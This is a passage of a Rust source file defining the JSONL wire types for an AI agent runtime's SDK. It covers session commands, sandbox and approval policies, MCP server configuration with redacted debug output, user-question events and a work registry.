//! Version 1 JSONL wire types shared by the o4 runtime and SDK.
//!
//! The protocol is additive: structs intentionally do not use
//! `deny_unknown_fields`, so a v1 peer may add fields without breaking older
//! clients. Unknown event tags are preserved as [`Event::Unknown`]. Peers use
//! the initialize/runtime-ready capability lists before relying on optional
//! events or behavior.

use std::collections::BTreeMap;
use std::fmt;

use serde::de::Error as _;
use serde::{Deserialize, Deserializer, Serialize, Serializer};
use serde_json::{Map, Value};

/// The JSONL wire protocol implemented by this crate.
pub const PROTOCOL_VERSION: u32 = 1;
/// Protocol versions this SDK can negotiate, in preference order.
pub const SUPPORTED_PROTOCOL_VERSIONS: &[u32] = &[PROTOCOL_VERSION];
/// SDK capabilities advertised during initialization.
pub const SDK_CAPABILITIES: &[&str] =
    &["event.unknown", "run.cancel", "run.steer", "session.resume"];
/// Placeholder runtime floor, deliberately separate from wire compatibility.
///
/// Until the runtime publishes its post-version-bump floor, this accepts every
/// valid stable semver. Applications can configure a stricter requirement in
/// the SDK without changing protocol negotiation.
pub const DEFAULT_RUNTIME_VERSION_REQUIREMENT: &str = ">=0.0.0";

/// One command, encoded as exactly one JSON object followed by `\n`.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct RequestEnvelope {
    pub protocol_version: u32,
    pub request_id: String,
    pub command: Command,
}

impl RequestEnvelope {
    pub fn new(request_id: impl Into<String>, command: Command) -> Self {
        Self {
            protocol_version: PROTOCOL_VERSION,
            request_id: request_id.into(),
            command,
        }
    }
}

/// One runtime event, encoded as exactly one JSON object followed by `\n`.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct EventEnvelope {
    pub protocol_version: u32,
    pub request_id: String,
    pub sequence: u64,
    /// RFC3339 timestamp supplied by the runtime.
    pub timestamp: String,
    pub runtime_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub run_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub context: Option<Context>,
    pub event: Event,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Context {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub correlation_id: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Command {
    Initialize {
        client_name: String,
        client_version: String,
        supported_protocol_versions: Vec<u32>,
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        capabilities: Vec<String>,
    },
    SessionCreate {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        session_id: Option<String>,
        model: String,
        cwd: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        system_prompt: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        reasoning: Option<Reasoning>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        execution_policy: Option<ExecutionPolicy>,
        #[serde(default)]
        mcp_servers: Vec<McpServerConfig>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        context: Option<Context>,
        /// The approval mode to run the session in, named as o4 names it:
        /// `ask`, `accept-edits`, `plan`, `review`, `auto` or `bypass`. The
        /// session then asks, allows and refuses exactly as an o4 window in
        /// that mode would, through `ApprovalRequested`. Unset keeps today's
        /// behaviour: `execution_policy` alone decides. Requires the
        /// `permission_modes` capability; an unknown name is refused.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        permission_mode: Option<String>,
        /// Which instructions the session's model is given: `full`, as an
        /// o4 window gives them (project instructions, memories, git
        /// history, ...), or `bare`, the short ones the service has always
        /// given. Unset is `bare`, so an existing caller is unchanged.
        /// Requires the `session_instructions` capability.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        instructions: Option<SessionInstructions>,
    },
    SessionResume {
        session_id: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        cwd: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        context: Option<Context>,
    },
    /// Change session configuration without replacing the session.
    SessionConfigure {
        session_id: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        model: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        reasoning: Option<Reasoning>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        permission_mode: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        title: Option<String>,
    },
    /// Ask the runtime to compact the session context.
    SessionCompact {
        session_id: String,
    },
    RunStart {
        session_id: String,
        prompt: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        output_schema: Option<Value>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        max_turns: Option<u32>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        token_budget: Option<u64>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        timeout_secs: Option<u64>,
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        attachments: Vec<Attachment>,
    },
    RunCancel {
        run_id: String,
    },
    RunSteer {
        run_id: String,
        instruction: String,
    },
    SessionClose {
        session_id: String,
    },
    Shutdown,

    // --- Daemon additions (spec daemon-core §6). Additive: a v1 peer that
    // never sends them is unaffected; a runtime advertises support through
    // `RuntimeReady.capabilities`.
    /// List every session the runtime currently hosts.
    SessionList,
    /// Subscribe this connection to a hosted session's events.
    SessionAttach {
        session_id: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        since_sequence: Option<u64>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        daemon_epoch: Option<String>,
    },
    /// Unsubscribe this connection from a hosted session's events.
    SessionDetach {
        session_id: String,
    },
    /// Snapshot the runtime's work registry.
    WorkList,
    /// Act on one work-registry row.
    WorkAction {
        work_id: String,
        action: WorkActionKind,
    },
    /// Answer a pending permission request fanned out as `ApprovalRequested`.
    ApprovalRespond {
        request_id: String,
        decision: ApprovalDecision,
    },
    /// Answer a pending user question fanned out as `QuestionAsked`.
    QuestionAnswer {
        request_id: String,
        answer: String,
        /// The user closed the question without answering; `answer` is
        /// ignored and the agent is told it was dismissed.
        #[serde(default, skip_serializing_if = "std::ops::Not::not")]
        dismissed: bool,
    },
    /// The user is working on a pending question: moving between its
    /// options or typing an answer. Starts its 5 minutes again when the
    /// user turned on `questions_auto_continue`, so the runtime never
    /// answers over someone who is answering. Requires the
    /// `interactive_questions` capability.
    QuestionActivity {
        request_id: String,
    },
    /// Quiesce a session's active run ahead of a handoff seal.
    RunDrain {
        session_id: String,
        #[serde(default)]
        now: bool,
    },
    /// Report a committed ownership change for a hosted session.
    SessionOwnership {
        session_id: String,
        owner: OwnerWire,
        owner_generation: i64,
    },
}

/// A multimodal input attached to one run prompt.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Attachment {
    Image(ImageAttachment),
}

/// Base64-encoded image data accepted by the runtime's image content path.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ImageAttachment {
    pub data: String,
    pub mime_type: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub width: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub height: Option<u32>,
}

/// What a `WorkAction` does to a registry row (spec daemon-core R4.4).
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum WorkActionKind {
    Stop,
    Message { text: String },
    Foreground,
    Rename { name: String },
    Clear,
}

/// Which instructions a hosted session's model is given.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SessionInstructions {
    /// The short instructions the service has always given; the client's
    /// `system_prompt`, if any, replaces them.
    #[default]
    Bare,
    /// What an o4 window gives its model for the same project, with the
    /// client's `system_prompt` layered in as the `-s` text is.
    Full,
}

/// Decision for a fanned-out permission request.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalDecision {
    Approve,
    Deny,
    /// Approve and remember for the rest of the session where the runtime
    /// allows it (`ApprovalRequested.always_allow_available`). For a plugin
    /// capability question (`ApprovalRequested.plugin_capability`) it is
    /// saved for the user, for every session and window, but only from a
    /// client that declared `plugin_capabilities`; from any other client it
    /// counts as one approval.
    AlwaysAllow,
}

/// Who owns a hosted session. Mirrors the handoff transfer protocol's
/// `Owner` so a client can correlate to a transfer record.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum OwnerWire {
    Local,
    Platform,
    Undecided,
}

/// Requested model reasoning effort.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Reasoning {
    Minimal,
    Low,
    Medium,
    High,
    Xhigh,
    Max,
}

/// Tool and sandbox permissions sent to the runtime.
///
/// Empty `allowed_tools` and `allowed_domains` mean no explicit grants. The
/// runtime remains responsible for applying its own secure baseline.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct ExecutionPolicy {
    #[serde(default)]
    pub allowed_tools: Vec<String>,
    #[serde(default)]
    pub denied_tools: Vec<String>,
    pub sandbox_mode: SandboxMode,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sandbox_config: Option<Value>,
    #[serde(default)]
    pub allowed_domains: Vec<String>,
    /// Park side-effecting tool calls on an `ApprovalRequested` event and
    /// wait for an attached client's `ApprovalRespond` (spec daemon-core
    /// R3.3). Off by default: an SDK caller that cannot answer a prompt keeps
    /// the static allow/deny behavior. Requires the `interactive_approvals`
    /// capability.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub interactive_approvals: bool,
    /// Give the session the `ask_user_question` tool: each question is
    /// published as `QuestionAsked` and waits for an attached client's
    /// `QuestionAnswer` (spec remote-session-control R1.14). Off by default:
    /// an SDK caller that cannot answer keeps today's toolset, so nothing
    /// waits on an answer nobody can give. Requires the
    /// `interactive_questions` capability.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub interactive_questions: bool,
    /// Give the session the user's plugin tools, as an o4 window has them
    /// (the project's too when it is trusted). A plugin tool that needs a
    /// capability asks first (`ApprovalRequested.plugin_capability`), so
    /// this takes effect only with `interactive_approvals` or a
    /// `permission_mode`. Off by default: an SDK session keeps today's
    /// toolset. Requires the `plugin_capabilities` capability.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub plugin_tools: bool,
}

impl Default for ExecutionPolicy {
    fn default() -> Self {
        Self {
            allowed_tools: Vec::new(),
            denied_tools: Vec::new(),
            sandbox_mode: SandboxMode::ReadOnly,
            sandbox_config: None,
            allowed_domains: Vec::new(),
            interactive_approvals: false,
            interactive_questions: false,
            plugin_tools: false,
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SandboxMode {
    Disabled,
    #[default]
    ReadOnly,
    WorkspaceWrite,
}

/// Configuration for one Model Context Protocol server.
///
/// Serialization includes the values needed by the runtime. The custom
/// [`Debug`] implementation deliberately omits environment values, header
/// values, URLs, and command arguments because they may contain credentials.
#[derive(Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "transport", rename_all = "snake_case")]
pub enum McpServerConfig {
    Stdio {
        name: String,
        command: String,
        #[serde(default)]
        args: Vec<String>,
        #[serde(default)]
        env: BTreeMap<String, String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        cwd: Option<String>,
        /// Most seconds one tool call to this server may take. Unset keeps
        /// the runtime's default of 30.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        tool_timeout_sec: Option<u64>,
    },
    Sse {
        name: String,
        url: String,
        #[serde(default)]
        headers: BTreeMap<String, String>,
        /// Most seconds one tool call to this server may take. Unset keeps
        /// the runtime's default of 30.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        tool_timeout_sec: Option<u64>,
    },
    /// MCP Streamable HTTP transport (protocol revision 2025-03-26+).
    ///
    /// Secrets are never carried inline: `bearer_token_env_var` and
    /// `env_http_headers` name environment variables that the runtime reads
    /// from its own process at connect time.
    StreamableHttp {
        name: String,
        url: String,
        #[serde(default)]
        headers: BTreeMap<String, String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        bearer_token_env_var: Option<String>,
        /// Header name -> environment variable name.
        #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
        env_http_headers: BTreeMap<String, String>,
        /// Most seconds one tool call to this server may take. Unset keeps
        /// the runtime's default of 30.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        tool_timeout_sec: Option<u64>,
    },
}

impl fmt::Debug for McpServerConfig {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Stdio {
                name,
                command,
                args,
                env,
                cwd,
                tool_timeout_sec,
            } => f
                .debug_struct("McpServerConfig::Stdio")
                .field("name", name)
                .field("command", command)
                .field("args", &format_args!("<{} redacted>", args.len()))
                .field("env_keys", &env.keys().collect::<Vec<_>>())
                .field("cwd", cwd)
                .field("tool_timeout_sec", tool_timeout_sec)
                .finish(),
            Self::Sse {
                name,
                url: _,
                headers,
                tool_timeout_sec,
            } => f
                .debug_struct("McpServerConfig::Sse")
                .field("name", name)
                .field("url", &"<redacted>")
                .field("header_names", &headers.keys().collect::<Vec<_>>())
                .field("tool_timeout_sec", tool_timeout_sec)
                .finish(),
            Self::StreamableHttp {
                name,
                url: _,
                headers,
                bearer_token_env_var,
                env_http_headers,
                tool_timeout_sec,
            } => f
                .debug_struct("McpServerConfig::StreamableHttp")
                .field("name", name)
                .field("url", &"<redacted>")
                .field("header_names", &headers.keys().collect::<Vec<_>>())
                .field("bearer_token_env_var", bearer_token_env_var)
                .field("env_http_headers", env_http_headers)
                .field("tool_timeout_sec", tool_timeout_sec)
                .finish(),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct RuntimeReady {
    pub runtime_version: String,
    pub supported_protocol_versions: Vec<u32>,
    #[serde(default)]
    pub capabilities: Vec<String>,
    /// Present when the runtime is daemon-capable (spec daemon-core R6.4).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub daemon: Option<DaemonInfo>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct DaemonInfo {
    /// Whether `[daemon] enabled` is on for this runtime's data dir.
    pub enabled: bool,
}

/// Capability strings a daemon-capable runtime advertises in
/// `RuntimeReady.capabilities` (spec daemon-core §6).
pub mod capabilities {
    pub const SESSION_LIST: &str = "session_list";
    pub const SESSION_ATTACH: &str = "session_attach";
    pub const SESSION_CONFIGURE: &str = "session_configure";
    pub const SESSION_COMPACT: &str = "session_compact";
    pub const ATTACH_REPLAY: &str = "attach_replay";
    pub const RUN_ATTACHMENTS: &str = "run_attachments";
    /// Client wants the agent loop's own events (`Event::AgentEvent`).
    pub const AGENT_EVENTS: &str = "agent_events";
    pub const WORK_REGISTRY: &str = "work_registry";
    pub const WORK_ACTION: &str = "work_action";
    pub const INTERACTIVE_APPROVALS: &str = "interactive_approvals";
    /// Sessions may ask the user questions (`QuestionAsked`), answered with
    /// `QuestionAnswer` and kept open with `QuestionActivity`.
    pub const INTERACTIVE_QUESTIONS: &str = "interactive_questions";
    /// `SessionCreate.permission_mode` is honoured: the session asks,
    /// allows and refuses as an o4 window in that mode would.
    pub const PERMISSION_MODES: &str = "permission_modes";
    /// Approvals carry what a window's own prompt shows (the whole request,
    /// the change, install scripts and the saveable rule), and a question
    /// can be answered as dismissed (`QuestionAnswer.dismissed`).
    pub const PROMPT_DETAILS: &str = "prompt_details";
    /// `SessionCreate.instructions` is honoured.
    pub const SESSION_INSTRUCTIONS: &str = "session_instructions";
    /// `ExecutionPolicy.plugin_tools` is honoured, and a plugin tool's
    /// capability question arrives as `ApprovalRequested.plugin_capability`.
    /// A client that declares it knows that `always_allow` on such a
    /// question is saved for the user, not just for the session.
    pub const PLUGIN_CAPABILITIES: &str = "plugin_capabilities";
    pub const RUN_DRAIN: &str = "run_drain";
    pub const SESSION_OWNERSHIP: &str = "session_ownership";
}

/// One hosted session as reported by `SessionList` (spec daemon-core R2.4).
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionSummary {
    pub session_id: String,
    /// The UUID the handoff transfer protocol keys on, when the session has one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_uuid: Option<String>,
    pub cwd: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    pub created_at: String,
    pub last_activity_at: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub active_run: Option<String>,
    #[serde(default)]
    pub attached_clients: u32,
    pub owner: OwnerWire,
    #[serde(default)]
    pub owner_generation: i64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reasoning: Option<Reasoning>,
    /// The session's approval mode as o4 names it (`ask`, `accept-edits`,
    /// …), when it was created with one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub permission_mode: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub messages_len: Option<u64>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionListed {
    #[serde(default)]
    pub sessions: Vec<SessionSummary>,
}

/// Registry row owner on the wire.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum WorkOwnerWire {
    Session { session_id: String },
    Process,
}

/// A pending input request attached to a registry row.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct PendingWire {
    pub request_id: String,
    /// `approval` or `question`.
    pub kind: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub summary: Option<String>,
}

/// One work-registry row (spec daemon-core R4.2). Every field a dashboard
/// needs; durations are elapsed milliseconds at snapshot time.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct WorkItemWire {
    pub id: String,
    pub name: String,
    /// Registry `WorkKind` in snake_case (`main_agent`, `sub_agent`,
    /// `bash_task`, …).
    pub kind: String,
    /// Registry `WorkStatus` in snake_case.
    pub status: String,
    pub owner: WorkOwnerWire,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent: Option<String>,
    pub elapsed_ms: u64,
    #[serde(default)]
    pub tokens_in: u64,
    #[serde(default)]
    pub tokens_out: u64,
    #[serde(default)]
    pub tool_calls: u32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub current_action: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pending: Option<PendingWire>,
    /// Terminal detail (error text, exit summary) when the row is finished.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub detail: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub stalled_secs: Option<u64>,
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct WorkCountsWire {
    #[serde(default)]
    pub needs_input: u32,
    #[serde(default)]
    pub active: u32,
    #[serde(default)]
    pub finished: u32,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct WorkListed {
    pub revision: u64,
    #[serde(default)]
    pub counts: WorkCountsWire,
    #[serde(default)]
    pub items: Vec<WorkItemWire>,
    /// True when the runtime cut the list at its row cap.
    #[serde(default)]
    pub truncated: bool,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct WorkActioned {
    pub work_id: String,
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct WorkChanged {
    pub revision: u64,
}

/// A permission request fanned out to every attached client (spec
/// daemon-core R3.3). Answer with `Command::ApprovalRespond`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct ApprovalRequested {
    pub request_id: String,
    /// Registry row that is parked on this request, when known.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub work_id: Option<String>,
    pub tool: String,
    pub summary: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub risk: Option<String>,
    #[serde(default)]
    pub always_allow_available: bool,
    /// The rule a window saves when the user picks "always allow" or
    /// "always deny", in the window's own rule syntax (`Bash(cargo test *)`).
    /// `None` when no rule fits the call; the window then offers neither.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub rule_pattern: Option<String>,
    /// What the tool does, as the window's prompt describes it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool_description: Option<String>,
    /// The full request as the window's prompt shows it (the call's
    /// arguments), where `summary` is only a short line.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub args: Option<String>,
    /// The change a write or edit would make, as diff-style lines.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub change_preview: Vec<String>,
    /// Install scripts a package install would run. When present the window
    /// shows its install-script warning, where saying yes means "don't".
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub install_scripts: Vec<InstallScript>,
    /// Set when a plugin tool asks for a capability it was not granted; a
    /// window shows it in its plugin permission pop-up. `approve` allows this
    /// call, `always_allow` the plugin installation from now on (see
    /// [`ApprovalDecision::AlwaysAllow`]), `deny` refuses.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub plugin_capability: Option<PluginCapabilityRequest>,
}

/// What a plugin tool asks for before it runs.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct PluginCapabilityRequest {
    pub plugin: String,
    pub scope: PluginScopeWire,
    /// `exec`, `network` or `tool:<name>`.
    pub capability: String,
    /// The plugin tool that asked.
    pub component: String,
    /// Which installation of the plugin, as the hash of its files: "always"
    /// covers that installation only.
    pub installation_id: String,
}

/// Where a plugin is installed.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PluginScopeWire {
    /// For the user, in `~/.o4/plugins`.
    Global,
    /// In the project's own `.o4/plugins`.
    Project,
}

/// One install script a package would run, with what looks dangerous in it.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct InstallScript {
    pub package: String,
    pub phase: String,
    pub body: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub red_flags: Vec<String>,
}

/// A user question fanned out to every attached client. Answer with
/// `Command::QuestionAnswer`.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct QuestionAsked {
    pub request_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub work_id: Option<String>,
    pub question: String,
    #[serde(default)]
    pub options: Vec<String>,
    /// Index into `options` of the answer the agent would choose itself, to
    /// be marked "(recommended)". With `questions_auto_continue` on, this is
    /// the answer a question left for 5 minutes continues with.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub recommended: Option<u32>,
}

/// A fanned-out question or approval is settled, sent to the session's
/// attached clients so none keeps showing a prompt that means nothing.
/// Clients that do not know it skip it as `Unknown`.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct RequestResolved {
    pub request_id: String,
    pub outcome: RequestOutcome,
    /// The option chosen, for `AutoContinued` only.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub answer: Option<String>,
}

/// How a fanned-out request ended.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RequestOutcome {
    /// A client answered it (first answer wins).
    Answered,
    /// `questions_auto_continue` chose the recommended option.
    AutoContinued,
    /// Nobody needs the answer any more: the run stopped or the session
    /// closed.
    Withdrawn,
    /// An outcome added after this build; still settled.
    #[serde(other)]
    Unknown,
}

impl RequestResolved {
    /// A request settled without naming an answer: a person's answer is
    /// never repeated to other windows, and a withdrawn one has none.
    pub fn settled(request_id: impl Into<String>, outcome: RequestOutcome) -> Self {
        Self {
            request_id: request_id.into(),
            outcome,
            answer: None,
        }
    }
}

/// Reply to `RunDrain` once the post-drain snapshot is committed (spec
/// daemon-core R5.3).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct RunDrained {
    pub journal_sequence: u64,
    pub journal_hash: String,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionOwnershipReported {
    pub owner: OwnerWire,
    pub owner_generation: i64,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionEvent {
    /// May duplicate the envelope field for runtimes that provide it in the
    /// payload. The envelope `session_id` remains authoritative metadata.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_id: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct SessionConfigured {
    pub session_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reasoning: Option<Reasoning>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub permission_mode: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
}

/// One event from the agent loop, sent whole to a client that asked for
/// `agent_events`. The object is the loop's own serialization, so it carries
/// every field a terminal needs to render the session exactly as an
/// in-process one would; the protocol does not interpret it.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct AgentEventWire {
    pub event: Value,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionCompacted {
    pub session_id: String,
    pub before_tokens: u64,
    pub after_tokens: u64,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct AgentStarted {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent_id: Option<String>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct RunStarted {
    /// May duplicate the envelope field for runtimes that provide it in the
    /// payload. The envelope `run_id` remains authoritative metadata.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub run_id: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct TurnStarted {
    pub turn: u32,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct MessageEvent {
    /// A complete message snapshot at this point in the stream.
    pub message: Value,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct ToolEvent {
    /// A complete tool-call snapshot at this point in the stream.
    pub tool_call: Value,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct WarningEvent {
    pub message: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub code: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct RouterDiagnostic {
    pub diagnostic: Value,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct RetryEvent {
    pub attempt: u32,
    pub reason: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub delay_ms: Option<u64>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ContextCompacted {
    pub before_tokens: u64,
    pub after_tokens: u64,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct ResourceLimit {
    pub resource: String,
    pub limit: Value,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub used: Option<Value>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SteeringInjected {
    pub instruction: String,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RunStatus {
    Completed,
    Cancelled,
    Failed,
    TimedOut,
    ResourceLimited,
    #[serde(other)]
    Unknown,
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
pub struct Usage {
    #[serde(default)]
    pub input_tokens: u64,
    #[serde(default)]
    pub output_tokens: u64,
    #[serde(default)]
    pub total_tokens: u64,
    #[serde(default)]
    pub cached_input_tokens: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cost_usd: Option<f64>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct RunCompleted {
    pub status: RunStatus,
    pub output: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub structured_output: Option<Value>,
    #[serde(default)]
    pub messages: Vec<Value>,
    #[serde(default)]
    pub usage: Usage,
    #[serde(default)]
    pub turns: u32,
    #[serde(default)]
    pub tool_calls: u32,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct CommandAck {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct ErrorEvent {
    pub code: String,
    pub message: String,
    #[serde(default)]
    pub retryable: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub details: Option<Value>,
}

/// A typed runtime event.
///
/// Unknown tags are retained rather than rejected. Applications should only
/// depend on optional event kinds after checking negotiated capabilities.
// An approval carries its whole prompt, so it is far larger than the other
// events; boxing it would change a public type for no real gain, since one
// event is handled at a time.
#[allow(clippy::large_enum_variant)]
#[derive(Clone, Debug, PartialEq)]
pub enum Event {
    RuntimeReady(RuntimeReady),
    SessionCreated(SessionEvent),
    SessionResumed(SessionEvent),
    SessionClosed(SessionEvent),
    SessionConfigured(SessionConfigured),
